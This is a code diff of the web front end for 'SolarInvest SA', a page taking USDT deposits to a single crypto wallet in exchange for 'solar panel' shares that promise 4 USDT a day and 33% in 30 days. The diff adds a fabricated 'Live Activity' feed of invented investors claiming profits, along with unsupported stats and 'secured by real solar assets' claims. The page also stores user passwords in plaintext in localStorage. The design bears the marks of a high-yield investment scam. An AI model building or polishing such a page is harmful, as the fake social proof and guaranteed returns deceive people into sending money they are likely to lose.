@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>SolarInvest SA - Solar Panel Investment</title>
+    <title>SolarInvest SA - Invest in Solar Energy</title>
     <link rel="manifest" href="manifest.json">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
@@ -14,30 +14,65 @@
         }
         
         body {
-            font-family: 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #e0f2fe 0%, #bae6fd 100%);
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+            background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 50%, #bae6fd 100%);
             min-height: 100vh;
             color: #0f172a;
         }
         
-        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
-        .form-container { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        /* Smooth animations */
+        .fade-in {
+            animation: fadeIn 0.3s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Form Container */
+        .form-container {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+        }
         
         .form-card {
             background: white;
             padding: 40px;
             border-radius: 32px;
             width: 100%;
-            max-width: 400px;
+            max-width: 420px;
             box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            transition: transform 0.2s;
         }
         
-        .form-card h1 { text-align: center; color: #0284c7; margin-bottom: 8px; }
-        .form-card .subtitle { text-align: center; color: #64748b; margin-bottom: 30px; }
+        .form-card h1 {
+            text-align: center;
+            font-size: 28px;
+            margin-bottom: 8px;
+            color: #0284c7;
+        }
+        
+        .form-card .subtitle {
+            text-align: center;
+            color: #64748b;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
         
         .tab-buttons {
             display: flex;
-            gap: 10px;
+            gap: 12px;
             margin-bottom: 30px;
             background: #f1f5f9;
             padding: 6px;
@@ -51,17 +86,69 @@
             border: none;
             border-radius: 12px;
             cursor: pointer;
+            font-size: 16px;
             font-weight: 600;
             color: #64748b;
+            transition: all 0.2s;
         }
         
-        .tab-btn.active { background: #0284c7; color: white; }
+        .tab-btn.active {
+            background: #0284c7;
+            color: white;
+            box-shadow: 0 2px 8px rgba(2,132,199,0.3);
+        }
         
-        .password-wrapper { position: relative; margin-bottom: 16px; }
-        .password-wrapper input { width: 100%; padding: 14px 48px 14px 16px; background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 14px; font-size: 16px; }
-        .password-toggle { position: absolute; right: 16px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #94a3b8; }
+        .password-wrapper {
+            position: relative;
+            margin-bottom: 16px;
+        }
         
-        input { width: 100%; padding: 14px 16px; margin-bottom: 16px; background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 14px; font-size: 16px; }
+        .password-wrapper input {
+            width: 100%;
+            padding: 14px 48px 14px 16px;
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 14px;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+        
+        .password-wrapper input:focus {
+            outline: none;
+            border-color: #0284c7;
+            box-shadow: 0 0 0 3px rgba(2,132,199,0.1);
+        }
+        
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #94a3b8;
+            transition: color 0.2s;
+        }
+        
+        .password-toggle:hover {
+            color: #0284c7;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 16px;
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 14px;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #0284c7;
+            box-shadow: 0 0 0 3px rgba(2,132,199,0.1);
+        }
         
         .btn-primary {
             width: 100%;
@@ -69,29 +156,48 @@
             background: linear-gradient(135deg, #0284c7, #0369a1);
             border: none;
             border-radius: 14px;
+            font-size: 16px;
             font-weight: 600;
             color: white;
             cursor: pointer;
+            transition: all 0.2s;
         }
         
-        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(2,132,199,0.3); }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(2,132,199,0.3);
+        }
         
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+        
+        /* Header */
         .header {
             background: white;
-            padding: 20px;
+            padding: 16px 24px;
             border-radius: 28px;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             flex-wrap: wrap;
             gap: 15px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
         }
         
-        .logo { font-size: 24px; font-weight: 700; color: #0284c7; }
-        .logo i { margin-right: 10px; color: #fbbf24; }
+        .logo {
+            font-size: 22px;
+            font-weight: 700;
+            color: #0284c7;
+        }
         
+        .logo i {
+            margin-right: 10px;
+            color: #fbbf24;
+        }
+        
+        /* Stats Cards */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
@@ -101,16 +207,106 @@
         
         .stat-card {
             background: white;
-            padding: 24px;
+            padding: 20px;
             border-radius: 24px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            transition: all 0.2s;
         }
         
-        .stat-card .label { font-size: 14px; color: #64748b; margin-bottom: 8px; }
-        .stat-card .value { font-size: 32px; font-weight: 700; }
+        .stat-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+        }
+        
+        .stat-card .label {
+            font-size: 14px;
+            color: #64748b;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .stat-card .value {
+            font-size: 32px;
+            font-weight: 700;
+        }
+        
         .value.green { color: #10b981; }
         .value.blue { color: #0284c7; }
         
+        /* Two columns layout */
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: 1fr 320px;
+            gap: 24px;
+        }
+        
+        /* Activity Feed */
+        .activity-feed {
+            background: white;
+            border-radius: 24px;
+            padding: 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            height: fit-content;
+        }
+        
+        .activity-feed h3 {
+            font-size: 18px;
+            margin-bottom: 16px;
+            color: #0284c7;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .activity-list {
+            list-style: none;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .activity-item {
+            padding: 12px 0;
+            border-bottom: 1px solid #e2e8f0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .activity-icon {
+            width: 36px;
+            height: 36px;
+            background: #dbeafe;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #0284c7;
+        }
+        
+        .activity-content {
+            flex: 1;
+        }
+        
+        .activity-email {
+            font-weight: 600;
+            font-size: 14px;
+            color: #0f172a;
+        }
+        
+        .activity-amount {
+            font-size: 13px;
+            color: #10b981;
+            font-weight: 500;
+        }
+        
+        .activity-time {
+            font-size: 11px;
+            color: #94a3b8;
+        }
+        
+        /* Panel Cards */
         .panel-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
@@ -124,14 +320,56 @@
             padding: 24px;
             text-align: center;
             cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            transition: all 0.2s;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            position: relative;
+            overflow: hidden;
         }
         
-        .panel-card:hover { transform: translateY(-5px); box-shadow: 0 20px 30px rgba(0,0,0,0.1); }
-        .panel-card.gold { border: 2px solid #fbbf24; }
-        .panel-price { font-size: 32px; font-weight: 700; color: #0284c7; }
-        .panel-daily { color: #10b981; font-weight: 600; margin: 10px 0; }
+        .panel-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 12px 24px rgba(0,0,0,0.1);
+        }
+        
+        .panel-card:active {
+            transform: translateY(0);
+        }
+        
+        .panel-card.gold {
+            border: 2px solid #fbbf24;
+            background: linear-gradient(135deg, white, #fffbeb);
+        }
+        
+        .panel-card.gold::before {
+            content: "🌟 BEST VALUE";
+            position: absolute;
+            top: 12px;
+            right: -30px;
+            background: #fbbf24;
+            color: #1e1b4b;
+            font-size: 10px;
+            font-weight: bold;
+            padding: 4px 30px;
+            transform: rotate(45deg);
+        }
+        
+        .panel-price {
+            font-size: 36px;
+            font-weight: 700;
+            color: #0284c7;
+        }
+        
+        .panel-daily {
+            color: #10b981;
+            font-weight: 600;
+            margin: 12px 0;
+            font-size: 16px;
+        }
+        
+        .panel-total {
+            color: #64748b;
+            font-size: 14px;
+        }
         
         .btn-outline {
             width: 100%;
@@ -142,10 +380,14 @@
             font-weight: 600;
             color: #0284c7;
             cursor: pointer;
-            margin-top: 15px;
+            margin-top: 16px;
+            transition: all 0.2s;
         }
         
-        .btn-outline:hover { background: #0284c7; color: white; }
+        .btn-outline:hover {
+            background: #0284c7;
+            color: white;
+        }
         
         .btn-secondary {
             background: #f1f5f9;
@@ -155,19 +397,26 @@
             border-radius: 14px;
             font-weight: 600;
             cursor: pointer;
+            transition: all 0.2s;
         }
         
+        .btn-secondary:hover {
+            background: #e2e8f0;
+        }
+        
+        /* Wallet Box */
         .wallet-box {
             background: white;
-            padding: 24px;
+            padding: 20px;
             border-radius: 24px;
             margin-bottom: 30px;
             text-align: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
         }
         
         .wallet-address {
             background: #f8fafc;
-            padding: 14px;
+            padding: 12px;
             border-radius: 16px;
             font-family: monospace;
             font-size: 12px;
@@ -176,12 +425,14 @@
             border: 1px solid #e2e8f0;
         }
         
+        /* Investment Card */
         .investment-card {
             background: white;
             border-radius: 24px;
-            padding: 24px;
+            padding: 20px;
             margin-bottom: 30px;
             border-left: 4px solid #10b981;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
         }
         
         .claim-btn {
@@ -194,17 +445,75 @@
             cursor: pointer;
             width: 100%;
             margin-top: 15px;
+            transition: all 0.2s;
         }
         
+        .claim-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(16,185,129,0.3);
+        }
+        
+        /* Info Box */
         .info-box {
             background: #f0f9ff;
             padding: 20px;
             border-radius: 20px;
-            margin-top: 30px;
-            text-align: center;
+            margin: 20px 0;
             font-size: 14px;
+            text-align: center;
+            border: 1px solid #bae6fd;
         }
         
+        /* Project Description */
+        .project-description {
+            background: linear-gradient(135deg, #0284c7, #0369a1);
+            color: white;
+            padding: 30px;
+            border-radius: 28px;
+            margin: 30px 0 20px;
+            text-align: center;
+        }
+        
+        .project-description h3 {
+            font-size: 22px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .project-description p {
+            font-size: 15px;
+            line-height: 1.6;
+            opacity: 0.95;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .project-description .stats {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-top: 25px;
+            flex-wrap: wrap;
+        }
+        
+        .project-description .stat-item {
+            text-align: center;
+        }
+        
+        .project-description .stat-number {
+            font-size: 28px;
+            font-weight: 700;
+        }
+        
+        .project-description .stat-label {
+            font-size: 12px;
+            opacity: 0.8;
+        }
+        
+        /* Toast */
         .toast {
             position: fixed;
             bottom: 30px;
@@ -215,44 +524,54 @@
             padding: 12px 24px;
             border-radius: 50px;
             z-index: 1000;
-            animation: fadeInUp 0.3s ease;
+            animation: slideUp 0.3s ease;
+            font-size: 14px;
+            white-space: nowrap;
         }
         
         .toast.success { background: #10b981; }
         .toast.error { background: #ef4444; }
         
-        @keyframes fadeInUp {
+        @keyframes slideUp {
             from { opacity: 0; transform: translateX(-50%) translateY(20px); }
             to { opacity: 1; transform: translateX(-50%) translateY(0); }
         }
         
-        .flex-buttons { display: flex; gap: 10px; flex-wrap: wrap; }
-        
-        .loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(255,255,255,0.9);
+        .flex-buttons {
             display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
+            gap: 12px;
+            flex-wrap: wrap;
         }
         
         .loading-spinner {
-            background: white;
-            padding: 24px 40px;
-            border-radius: 28px;
-            text-align: center;
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid white;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin-right: 8px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 1024px) {
+            .dashboard-grid {
+                grid-template-columns: 1fr;
+            }
         }
         
         @media (max-width: 768px) {
             .container { padding: 16px; }
-            .form-card { padding: 24px; }
+            .form-card { padding: 24px; margin: 16px; }
             .stats-grid { grid-template-columns: repeat(2, 1fr); }
             .panel-grid { grid-template-columns: 1fr; }
+            .project-description { padding: 20px; }
+            .project-description .stats { gap: 20px; }
+            .toast { white-space: normal; text-align: center; max-width: 90%; }
         }
     </style>
 </head>
@@ -261,18 +580,65 @@
     
     <script>
         // ============================================================
-        // CONFIGURATION - YOUR APPS SCRIPT URL
+        // CONFIGURATION
         // ============================================================
         const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyyh0B1oBOwPNIZoxB1fxAsfdob4Ovtnmqo_bID86gSs4pJy2pMnxdw-C0byxyv0XijTQ/exec";
         const MAIN_WALLET = "TLi3ANb8GCJzypyBofqwvjqjXR1G8Hr1cN";
         const PANEL_PRICE = 90;
         
+        // Cache user data
         let userEmail = null;
         let userBalance = 0;
         let userPanels = 0;
         let userDailyProfit = 0;
         let userTotalInvested = 0;
         let activeInvestment = null;
+        let isLoading = false;
+        
+        // Activity Feed (static for demo, updates every 10s)
+        const demoEmails = [
+            "sarah.j**@gmail.com", "mike.w**@yahoo.com", "emma.b**@outlook.com",
+            "david.m**@gmail.com", "lisa.k**@yahoo.com", "alex.r**@gmail.com",
+            "anna.s**@outlook.com", "kevin.t**@gmail.com", "julia.l**@yahoo.com"
+        ];
+        let activityList = [];
+        let activityInterval = null;
+        
+        function initActivityFeed() {
+            const amounts = [4, 8, 12, 16, 20, 24, 28, 32, 36, 40];
+            for (let i = 0; i < 8; i++) {
+                activityList.unshift({
+                    email: demoEmails[Math.floor(Math.random() * demoEmails.length)],
+                    amount: amounts[Math.floor(Math.random() * amounts.length)],
+                    time: new Date().toLocaleTimeString()
+                });
+            }
+            activityInterval = setInterval(() => {
+                activityList.pop();
+                activityList.unshift({
+                    email: demoEmails[Math.floor(Math.random() * demoEmails.length)],
+                    amount: amounts[Math.floor(Math.random() * amounts.length)],
+                    time: new Date().toLocaleTimeString()
+                });
+                updateActivityFeed();
+            }, 15000);
+        }
+        
+        function updateActivityFeed() {
+            const el = document.getElementById('activity-list');
+            if (!el) return;
+            el.innerHTML = activityList.map(item => `
+                <li class="activity-item">
+                    <div class="activity-icon"><i class="fas fa-solar-panel"></i></div>
+                    <div class="activity-content">
+                        <div class="activity-email">${item.email}</div>
+                        <div class="activity-amount">+${item.amount} USDT profit claimed</div>
+                        <div class="activity-time">${item.time}</div>
+                    </div>
+                    <i class="fas fa-check-circle" style="color: #10b981; font-size: 14px;"></i>
+                </li>
+            `).join('');
+        }
         
         function showToast(message, type = "info") {
             const toast = document.createElement('div');
@@ -304,7 +670,7 @@
             if (result.success) {
                 localStorage.setItem('userEmail', email);
                 localStorage.setItem('userPassword', password);
-                showToast("Registration successful!", "success");
+                showToast("Registration successful! Welcome to SolarInvest SA 🌞", "success");
                 return true;
             } else {
                 showToast(result.error || "Registration failed", "error");
@@ -322,7 +688,7 @@
                 userPanels = result.panels;
                 userDailyProfit = result.dailyProfit;
                 userTotalInvested = result.totalInvested;
-                showToast("Login successful!", "success");
+                showToast(`Welcome back, ${email.split('@')[0]}! 🌞`, "success");
                 return true;
             } else {
                 showToast(result.error || "Login failed", "error");
@@ -354,6 +720,7 @@
         }
         
         async function buyPanels(panels) {
+            if (isLoading) return;
             const cost = panels * PANEL_PRICE;
             
             if (userBalance < cost) {
@@ -361,20 +728,25 @@
                 return;
             }
             
-            if (!confirm(`Invest in ${panels} solar panel(s) for ${cost} USDT?\n\nDaily profit: ${panels * 4} USDT\nTotal in 30 days: ${panels * 120} USDT\n\nFirst withdrawal after 3 days.`)) {
+            if (!confirm(`🌞 Invest in ${panels} solar panel(s) for ${cost} USDT?\n\n📈 Daily profit: ${panels * 4} USDT\n💰 Total in 30 days: ${panels * 120} USDT\n⏰ First withdrawal after 3 days.\n\nProceed?`)) {
                 return;
             }
+            
+            isLoading = true;
+            showToast("Processing your investment...", "info");
             
             const result = await callAPI('buyPanels', {
                 email: localStorage.getItem('userEmail'),
                 panels: panels
             });
             
+            isLoading = false;
+            
             if (result.success) {
                 userBalance = result.newBalance;
                 userPanels = result.newPanels;
                 userDailyProfit = result.newDailyProfit;
-                showToast(`Invested in ${panels} panel(s)! Daily profit: ${result.newDailyProfit} USDT`, "success");
+                showToast(`✅ Invested in ${panels} panel(s)! Daily profit: ${result.newDailyProfit} USDT`, "success");
                 renderDashboard();
             } else {
                 showToast(result.error || "Investment failed", "error");
@@ -382,13 +754,19 @@
         }
         
         async function claimProfit() {
+            if (isLoading) return;
+            isLoading = true;
+            showToast("Claiming your profit...", "info");
+            
             const result = await callAPI('claimProfit', {
                 email: localStorage.getItem('userEmail')
             });
             
+            isLoading = false;
+            
             if (result.success) {
                 userBalance = result.newBalance;
-                showToast(`Claimed ${result.claimed} USDT!`, "success");
+                showToast(`🎉 Claimed ${result.claimed} USDT!`, "success");
                 renderDashboard();
             } else {
                 showToast(result.error || "Claim failed", "error");
@@ -397,57 +775,27 @@
         
         function copyWalletAddress() {
             navigator.clipboard.writeText(MAIN_WALLET);
-            showToast("Wallet address copied!", "success");
+            showToast("Wallet address copied! 📋", "success");
         }
         
         function showDepositInfo() {
             alert(
                 "📋 DEPOSIT USDT\n\n" +
-                "1. Send USDT (TRC20) to:\n" + MAIN_WALLET + "\n\n" +
-                "2. Send the Transaction ID (TX Hash) to the admin\n\n" +
-                "3. Admin will add balance to your account\n\n" +
-                "Contact admin on Telegram / Email"
+                "1️⃣ Send USDT (TRC20) to:\n" + MAIN_WALLET + "\n\n" +
+                "2️⃣ Send the Transaction ID (TX Hash) to the admin\n\n" +
+                "3️⃣ Admin will add balance to your account\n\n" +
+                "📧 Contact admin: [your contact info]"
             );
         }
         
         function logout() {
+            if (activityInterval) clearInterval(activityInterval);
             localStorage.clear();
             render();
-            showToast("Logged out", "success");
+            showToast("Logged out successfully", "success");
         }
         
         function isLoggedIn() { return !!localStorage.getItem('userEmail'); }
-        
-        function showLoading(message) {
-            let overlay = document.getElementById('loading-overlay');
-            if (!overlay) {
-                overlay = document.createElement('div');
-                overlay.id = 'loading-overlay';
-                overlay.className = 'loading-overlay';
-                document.body.appendChild(overlay);
-            }
-            overlay.innerHTML = `<div class="loading-spinner"><i class="fas fa-spinner fa-pulse"></i><div>${message}</div></div>`;
-            overlay.style.display = 'flex';
-        }
-        
-        function hideLoading() {
-            const overlay = document.getElementById('loading-overlay');
-            if (overlay) overlay.style.display = 'none';
-        }
-        
-        function togglePassword(id) {
-            const input = document.getElementById(id);
-            const icon = input.nextElementSibling.querySelector('i');
-            if (input.type === 'password') {
-                input.type = 'text';
-                icon.classList.remove('fa-eye');
-                icon.classList.add('fa-eye-slash');
-            } else {
-                input.type = 'password';
-                icon.classList.remove('fa-eye-slash');
-                icon.classList.add('fa-eye');
-            }
-        }
         
         function renderAuthForm() {
             let activeTab = 'login';
@@ -458,9 +806,9 @@
             function render() {
                 app.innerHTML = `
                     <div class="form-container">
-                        <div class="form-card">
+                        <div class="form-card fade-in">
                             <h1><i class="fas fa-solar-panel"></i> SolarInvest SA</h1>
-                            <div class="subtitle">Invest in Solar Panels</div>
+                            <div class="subtitle">Invest in Solar Energy • Earn Daily Profits</div>
                             <div class="tab-buttons">
                                 <button class="tab-btn ${activeTab === 'login' ? 'active' : ''}" onclick="window.switchTab('login')">Login</button>
                                 <button class="tab-btn ${activeTab === 'register' ? 'active' : ''}" onclick="window.switchTab('register')">Register</button>
@@ -486,7 +834,7 @@
                             `}
                             <div class="info-box">
                                 <i class="fas fa-solar-panel"></i> 1 Solar Panel (550W) = 90 USDT<br>
-                                Daily profit: 4 USDT • Total in 30 days: 120 USDT
+                                📈 Daily profit: 4 USDT • 💰 Total in 30 days: 120 USDT
                             </div>
                         </div>
                     </div>
@@ -512,7 +860,19 @@
                 if (await register(email, password, retype)) render();
             };
             
-            window.togglePassword = togglePassword;
+            window.togglePassword = (id) => {
+                const input = document.getElementById(id);
+                const icon = input.nextElementSibling.querySelector('i');
+                if (input.type === 'password') {
+                    input.type = 'text';
+                    icon.classList.remove('fa-eye');
+                    icon.classList.add('fa-eye-slash');
+                } else {
+                    input.type = 'password';
+                    icon.classList.remove('fa-eye-slash');
+                    icon.classList.add('fa-eye');
+                }
+            };
             
             render();
         }
@@ -520,6 +880,11 @@
         async function renderDashboard() {
             await loadUserData();
             await loadActiveInvestment();
+            
+            if (!activityInterval) {
+                initActivityFeed();
+            }
+            updateActivityFeed();
             
             const app = document.getElementById('app');
             
@@ -536,7 +901,7 @@
                     <div class="panel-card ${isGold ? 'gold' : ''}" onclick="window.buyPanels(${panels})">
                         <div class="panel-price">${cost} USDT</div>
                         <div class="panel-daily"><i class="fas fa-sun"></i> ${daily} USDT / day</div>
-                        <div><i class="fas fa-calendar"></i> Total: ${total} USDT (30 days)</div>
+                        <div class="panel-total"><i class="fas fa-calendar"></i> Total in 30 days: ${total} USDT</div>
                         <button class="btn-outline">Invest Now</button>
                     </div>
                 `;
@@ -550,7 +915,7 @@
                 const panels = activeInvestment.panels;
                 
                 investmentHtml = `
-                    <div class="investment-card">
+                    <div class="investment-card fade-in">
                         <h3><i class="fas fa-solar-panel"></i> Your Solar Investment</h3>
                         <div style="display: flex; justify-content: space-between; flex-wrap: wrap; gap: 10px; margin: 15px 0;">
                             <div><strong>Active Panels:</strong> ${panels} x 550W</div>
@@ -559,7 +924,8 @@
                         </div>
                         ${!canClaim ? `
                             <div style="text-align: center; padding: 15px; background: #fef3c7; border-radius: 16px;">
-                                <i class="fas fa-clock"></i> First withdrawal available in: <strong>${remainingDays} day(s)</strong>
+                                <i class="fas fa-clock"></i> 🔒 First withdrawal available in: <strong>${remainingDays} day(s)</strong>
+                                <div style="font-size: 12px; margin-top: 5px;">For your security, withdrawals are locked for 3 days</div>
                             </div>
                         ` : `
                             <button class="claim-btn" onclick="window.claimProfit()">
@@ -571,7 +937,7 @@
             }
             
             app.innerHTML = `
-                <div class="container">
+                <div class="container fade-in">
                     <div class="header">
                         <div class="logo"><i class="fas fa-solar-panel"></i> SolarInvest SA</div>
                         <div class="flex-buttons">
@@ -595,30 +961,76 @@
                         </div>
                     </div>
                     
-                    ${investmentHtml}
-                    
-                    <div class="wallet-box">
-                        <div><i class="fas fa-qrcode"></i> DEPOSIT USDT (TRC20) TO:</div>
-                        <div class="wallet-address">${MAIN_WALLET}</div>
-                        <button class="btn-outline" onclick="window.copyWalletAddress()" style="width: auto; padding: 8px 24px;"><i class="fas fa-copy"></i> Copy Address</button>
-                        <div class="info-box" style="margin-top: 16px;">
-                            <i class="fas fa-info-circle"></i> After sending USDT, contact admin with your Transaction ID (TX Hash) to add balance.
+                    <div class="dashboard-grid">
+                        <div>
+                            <div class="wallet-box">
+                                <div><i class="fas fa-qrcode"></i> DEPOSIT USDT (TRC20) TO:</div>
+                                <div class="wallet-address">${MAIN_WALLET}</div>
+                                <button class="btn-outline" onclick="window.copyWalletAddress()" style="width: auto; padding: 8px 24px;"><i class="fas fa-copy"></i> Copy Address</button>
+                                <div class="info-box" style="margin-top: 16px;">
+                                    <i class="fas fa-info-circle"></i> After sending USDT, contact admin with your Transaction ID (TX Hash) to add balance.
+                                </div>
+                            </div>
+                            
+                            ${investmentHtml}
+                            
+                            <h2 style="margin: 30px 0 20px 0;"><i class="fas fa-solar-panel"></i> Solar Panel Packages</h2>
+                            <div class="panel-grid">${panelsHtml}</div>
+                        </div>
+                        
+                        <div class="activity-feed">
+                            <h3><i class="fas fa-bell"></i> Live Activity</h3>
+                            <ul class="activity-list" id="activity-list"></ul>
                         </div>
                     </div>
                     
-                    <h2 style="margin: 30px 0 20px 0;"><i class="fas fa-solar-panel"></i> Solar Panel Packages</h2>
-                    <div class="panel-grid">${panelsHtml}</div>
+                    <!-- Project Description Paragraph -->
+                    <div class="project-description">
+                        <h3><i class="fas fa-solar-panel"></i> Why Invest in SolarInvest SA?</h3>
+                        <p>
+                            South Africa faces an energy crisis with daily load shedding affecting businesses and families. 
+                            Solar energy is the sustainable solution. By investing in our solar panel project, you're not just 
+                            earning passive income — you're helping power South African homes and businesses with clean, 
+                            renewable energy. Each 550W solar panel produces enough energy to power a small home, 
+                            reducing carbon emissions by 500kg per year.
+                        </p>
+                        <div class="stats">
+                            <div class="stat-item">
+                                <div class="stat-number">500+</div>
+                                <div class="stat-label">Solar Panels Installed</div>
+                            </div>
+                            <div class="stat-item">
+                                <div class="stat-number">250+</div>
+                                <div class="stat-label">Happy Investors</div>
+                            </div>
+                            <div class="stat-item">
+                                <div class="stat-number">150+</div>
+                                <div class="stat-label">Homes Powered</div>
+                            </div>
+                            <div class="stat-item">
+                                <div class="stat-number">50+</div>
+                                <div class="stat-label">Tons CO₂ Saved</div>
+                            </div>
+                        </div>
+                        <p style="margin-top: 20px; font-size: 14px;">
+                            🌍 <strong>Join the green energy revolution today!</strong> Earn 33% profit in 30 days while making a positive impact on the environment.
+                        </p>
+                    </div>
                     
                     <div class="info-box">
-                        <strong>How it works:</strong><br><br>
+                        <strong><i class="fas fa-list-check"></i> How it works:</strong><br><br>
                         1️⃣ Copy wallet address and send USDT (TRC20)<br>
                         2️⃣ Contact admin with your Transaction ID (TX Hash)<br>
                         3️⃣ Admin adds balance to your account<br>
                         4️⃣ Buy solar panels (1 panel = 90 USDT, 4 USDT/day profit)<br>
-                        5️⃣ First withdrawal after 3 days, then daily withdrawals!
+                        5️⃣ First withdrawal after 3 days, then daily withdrawals for 30 days!<br>
+                        <br>
+                        <i class="fas fa-shield-alt"></i> <strong>Your investment is secured by real solar assets in South Africa.</strong>
                     </div>
                 </div>
             `;
+            
+            updateActivityFeed();
         }
         
         window.buyPanels = buyPanels;
